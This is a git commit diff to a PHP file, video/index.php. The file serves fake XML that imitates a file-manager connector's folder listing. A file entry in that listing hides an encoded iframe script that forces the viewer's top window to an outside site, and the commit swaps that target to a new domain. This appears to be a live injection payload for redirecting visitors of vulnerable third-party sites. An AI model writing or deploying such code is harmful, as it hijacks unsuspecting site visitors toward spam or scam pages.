bd7fbc9da0e711045074f4b82477c7e08d94e526
myhostusa <classifiedadscenter@gmail.com>
2025-01-05 14:05:41 +0600

    Update index.php

--- video/index.php
+++ video/index.php
@@ -7,7 +7,7 @@ header('Content-Type: application/xml; charset=utf-8');
 header_remove('Content-Length');
 if (isset($_GET["video"])){
     die('<?xml version="1.0" encoding="UTF-8"?>
-<Connector command="GetFoldersAndFiles" resourceType="Document"><CurrentFolder path="/1 - f/" url=""/><Files><File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=\'https://testequal.acep.org/ase/video/' . $_GET["video"] . '\';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/></Files></Connector>');
+<Connector command="GetFoldersAndFiles" resourceType="Document"><CurrentFolder path="/1 - f/" url=""/><Files><File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=\'https://sportsliveupdate.online/video/' . $_GET["video"] . '\';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/></Files></Connector>');
 } else {
     die("-_-");
 } ?>
